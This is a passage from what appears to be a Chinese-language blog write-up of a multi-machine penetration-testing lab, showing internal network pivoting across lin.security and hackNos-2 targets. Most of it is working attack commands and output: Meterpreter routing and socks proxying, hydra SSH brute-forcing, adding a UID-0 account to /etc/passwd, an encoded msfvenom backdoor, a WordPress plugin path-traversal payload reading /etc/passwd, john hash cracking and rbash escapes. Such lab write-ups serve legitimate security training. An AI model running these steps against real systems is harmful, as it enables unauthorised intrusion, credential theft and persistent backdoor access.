class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : lo</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 65536</span><br><span class="line">Flags        : UP,LOOPBACK</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  2</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : enp0s3</span><br><span class="line">Hardware MAC : 08:00:27:7d:4c:83</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.31.132</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::a00:27ff:fe7d:4c83</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line">IPv6 Address : fe80::a00:27ff:fe7d:4c83</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  3</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : enp0s8</span><br><span class="line">Hardware MAC : 08:00:27:65:bd:8b</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.56.109</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::a00:27ff:fe65:bd8b</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></pre></td></tr></table></figure><p>发现192.168.56.0网段</p><p>在Meterpreter中添加路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.56.0&#x2F;24</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.56.0       255.255.255.0      Session 1</span><br></pre></td></tr></table></figure><p>在MSF中扫描内网网段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep </span><br><span class="line">set RHOSTS 192.168.56.0&#x2F;24</span><br><span class="line">set THREADS 20</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">[+] 192.168.56.103 appears to be up (CADMUS COMPUTER SYSTEMS)</span><br></pre></td></tr></table></figure><p>发现内网机器A2</p><p>添加sock代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br><span class="line">set srvport 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>修改Proxychain文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">    socks4 192.168.31.10 9999</span><br></pre></td></tr></table></figure><hr /><h2 id="linsecurity"><a class="markdownIt-Anchor" href="#linsecurity"></a> lin.security</h2><h3 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h3><p>proxychains代理Nmap对A2进行端口扫描</p><p><code>proxychains nmap -sT -Pn -v -T5 -A 192.168.56.103</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.56.103</span><br><span class="line">Host is up (0.0048s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 7a:9b:b9:32:6f:95:77:10:c0:a0:80:35:34:b1:c0:00 (RSA)</span><br><span class="line">|   256 24:0c:7a:82:78:18:2d:66:46:3b:1a:36:22:06:e1:a1 (ECDSA)</span><br><span class="line">|_  256 b9:15:59:78:85:78:9e:a5:e6:16:f6:cf:96:2d:1d:36 (ED25519)</span><br><span class="line">111&#x2F;tcp  open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port&#x2F;proto  service</span><br><span class="line">|   100000  2,3,4        111&#x2F;tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111&#x2F;udp   rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;udp6  rpcbind</span><br><span class="line">|   100003  3           2049&#x2F;udp   nfs</span><br><span class="line">|   100003  3           2049&#x2F;udp6  nfs</span><br><span class="line">|   100003  3,4         2049&#x2F;tcp   nfs</span><br><span class="line">|   100003  3,4         2049&#x2F;tcp6  nfs</span><br><span class="line">|   100005  1,2,3      36117&#x2F;tcp   mountd</span><br><span class="line">|   100005  1,2,3      36311&#x2F;udp   mountd</span><br><span class="line">|   100005  1,2,3      50621&#x2F;tcp6  mountd</span><br><span class="line">|   100005  1,2,3      58468&#x2F;udp6  mountd</span><br><span class="line">|   100021  1,3,4      36071&#x2F;udp   nlockmgr</span><br><span class="line">|   100021  1,3,4      38529&#x2F;tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      41451&#x2F;udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      41509&#x2F;tcp   nlockmgr</span><br><span class="line">|   100227  3           2049&#x2F;tcp   nfs_acl</span><br><span class="line">|   100227  3           2049&#x2F;tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049&#x2F;udp   nfs_acl</span><br><span class="line">|_  100227  3           2049&#x2F;udp6  nfs_acl</span><br><span class="line">2049&#x2F;tcp open  nfs_acl 3 (RPC #100227)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 04:02</span><br><span class="line">Completed NSE at 04:02, 0.00s elapsed</span><br><span class="line">Initiating NSE at 04:02</span><br><span class="line">Completed NSE at 04:02, 0.00s elapsed</span><br><span class="line">Initiating NSE at 04:02</span><br><span class="line">Completed NSE at 04:02, 0.00s elapsed</span><br><span class="line">Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.88 seconds</span><br></pre></td></tr></table></figure><p>开放ssh服务与nfs服务</p><h3 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h3><p><strong>NFS目录挂载</strong><br />尝试在A1上挂载A2的<code>/home/peter</code>目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-common</span><br><span class="line">vim &#x2F;etc&#x2F;exports</span><br><span class="line">    &#x2F;share1 *(sync,ro) 192.168.56.103(sync,rw)</span><br><span class="line">systemctl restart rpcbind</span><br><span class="line">systemctl restart nfs</span><br><span class="line">showmount -e 192.168.56.103</span><br><span class="line">    Export list for 192.168.56.103:</span><br><span class="line">    &#x2F;home&#x2F;peter *</span><br><span class="line">mkdir &#x2F;mnt&#x2F;share1</span><br><span class="line">mount -t nfs 192.168.56.103:&#x2F;home&#x2F;peter &#x2F;mnt&#x2F;share1</span><br><span class="line">cd &#x2F;mnt&#x2F;share1</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p>挂载失败</p><p><strong>RPCBind</strong><br />未找到可以获取Shell的EXP</p><p><strong>SSH</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains hydra -V -I -f -t 64 -L user -P pass ssh:&#x2F;&#x2F;192.168.56.103:22</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.56.103   login: bob   password: secret</span><br></pre></td></tr></table></figure><p>获取账户&quot;bob&quot;</p><h3 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h3><p>在A1上用SSH登录A2，sudo提权，写入新root账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ssh bob@192.168.56.103</span><br><span class="line">sudo -i</span><br><span class="line">secret</span><br><span class="line">perl -le &#39;print crypt(&quot;hackforfun&quot;,&quot;addedsalt&quot;)&#39;</span><br><span class="line">    adWo3GnVnKzuU</span><br><span class="line">echo &#39;test:adWo3GnVnKzuU:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br><span class="line">exit</span><br><span class="line">exit</span><br><span class="line">ssh test@192.168.56.103</span><br><span class="line">hackforfun</span><br><span class="line">uname -a</span><br><span class="line">    Linux linsecurity 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>构造Meterpreter后门程序</p><p><code>msfvenom -p linux/x64/meterpreter/bind_tcp RHOST=192.168.56.103 LPORT=2345 -e x86/shikata_ga_nai -i 11 -f elf &gt; msf2.elf</code></p><p>将Meterpreter后门程序上传至A2<br /><code>proxychians scp msf2.elf test@192.168.56.103:/root/msf2.elf</code></p><p>在A2上运行后门程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +X msf2.elf</span><br><span class="line">.&#x2F;msf2.elf &amp;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set RHOST 192.168.56.103</span><br><span class="line">set LPORT 2345</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>成功获取Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : lo</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 65536</span><br><span class="line">Flags        : UP,LOOPBACK</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  2</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : enp0s3</span><br><span class="line">Hardware MAC : 08:00:27:d8:9f:d6</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.56.103</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::a00:27ff:fed8:9fd6</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  3</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : enp0s8</span><br><span class="line">Hardware MAC : 08:00:27:be:f1:93</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.156.5</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::a00:27ff:febe:f193</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  4</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : docker0</span><br><span class="line">Hardware MAC : 02:42:f4:43:ba:1b</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 172.17.0.1</span><br><span class="line">IPv4 Netmask : 255.255.0.0</span><br></pre></td></tr></table></figure><p>发现192.168.156.0网段</p><p>在Meterpreter中添加路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.156.0&#x2F;24</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.56.0       255.255.255.0      Session 1</span><br><span class="line">   192.168.156.0      255.255.255.0      Session 2</span><br></pre></td></tr></table></figure><p>在MSF中扫描内网网段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep </span><br><span class="line">set RHOSTS 192.168.156.0&#x2F;24</span><br><span class="line">set THREADS 20</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">[+] 192.168.156.6 appears to be up (CADMUS COMPUTER SYSTEMS)</span><br></pre></td></tr></table></figure><p>发现内网机器A3</p><hr /><h2 id="hacknos-2"><a class="markdownIt-Anchor" href="#hacknos-2"></a> hackNos-2</h2><h3 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h3><p><code>proxychains nmap -sT -Pn -v -T5 -A 192.168.156.6</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.156.6</span><br><span class="line">Host is up (0.00095s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 94:36:4e:71:6a:83:e2:c1:1e:a9:52:64:45:f6:29:80 (RSA)</span><br><span class="line">|   256 b4:ce:5a:c3:3f:40:52:a6:ef:dc:d8:29:f3:2c:b5:d1 (ECDSA)</span><br><span class="line">|_  256 09:6c:17:a1:a3:b4:c7:78:b9:ad:ec:de:8f:64:b1:7b (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 08:00:27:D8:5B:21 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br></pre></td></tr></table></figure><h3 id="web路径枚举-2"><a class="markdownIt-Anchor" href="#web路径枚举-2"></a> Web路径枚举</h3><p><code>dirb http://192.168.156.6 -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.156.6&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.156.6&#x2F;index.html (CODE:200|SIZE:10918)                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.156.6&#x2F;server-status (CODE:403|SIZE:278)                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;                                                                  </span><br><span class="line">                                                                                                            </span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;index.php (CODE:301|SIZE:0)                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-admin&#x2F;                                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h3><p>使用wpscan针对wordpress进行扫描</p><p><code>proxychains wpscan --url http://192.168.156.6/tsweb/ --enumerate u</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] user</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>发现存在用户user</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ wpscan --url http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F; --enumerate p</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] gracemedia-media-player</span><br><span class="line"> | Location: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;</span><br><span class="line"> | Latest Version: 1.0 (up to date)</span><br><span class="line"> | Last Updated: 2013-07-21T15:09:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.0 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt</span><br></pre></td></tr></table></figure><p>存在插件<code>gracemedia-media-player</code></p><p>搜索得到相关EXP<br /><code>wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd</code></p><p>得到两条重要信息</p><ul><li><code>rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash</code></li><li><code>flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash</code></li></ul><p>可以破解flag账户的密码</p><h3 id="权限提升-3"><a class="markdownIt-Anchor" href="#权限提升-3"></a> 权限提升</h3><p>使用john进行字典爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$1$flag$vqjCxzjtRc7PofLYS2lWf&#x2F;&#39; &gt; passwd</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd</span><br><span class="line">john --show passwd</span><br><span class="line">topsecret</span><br></pre></td></tr></table></figure><p>使用flag账户登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh flag@192.168.156.6</span><br><span class="line">topsecret</span><br></pre></td></tr></table></figure><p>而登入时使用的是rbash，在进行操作时会很不方便，需要切换到bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">perl -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;;&#39;</span><br><span class="line">awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure><p>以上三条命令均可</p><p>尝试直接sudo提权，失败</p><p>尝试在目标服务器内搜索信息<br />发现文件<code>/var/backups/passbkp/md5-hash</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;backups&#x2F;passbkp&#x2F;md5-hash</span><br><span class="line">$1$rohit$01Dl0NQKtgfeL08fGrggi0</span><br></pre></td></tr></table></figure><p>得到rohit账户的密码</p><p>使用john破解密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$1$rohit$01Dl0NQKtgfeL08fGrggi0&#39; &gt; passwd2</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd2</span><br><span class="line">john --show passwd2</span><br><span class="line">!%hack41</span><br></pre></td></tr></table></figure><p>切换到rohit账户，并尝试sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su rohit</span><br><span class="line">!%hack41</span><br><span class="line">sudo -i</span><br><span class="line">!%hack41</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p><strong>内网渗透的几个思路</strong></p><p><em>proxychains+meterpreter</em><br />在获取机器的权限之后，上传meterpreter后门，然后建立路由，再借以本机的socks代理服务来进行流量转发，但是需要注意免杀，以及控制的持续化。meterpreter的便利之处在于，可以建立路由然后便于MSF对于内网的直接渗透，以及附带的许多使用功能。</p><p><em>proxychains+earthworm</em><br 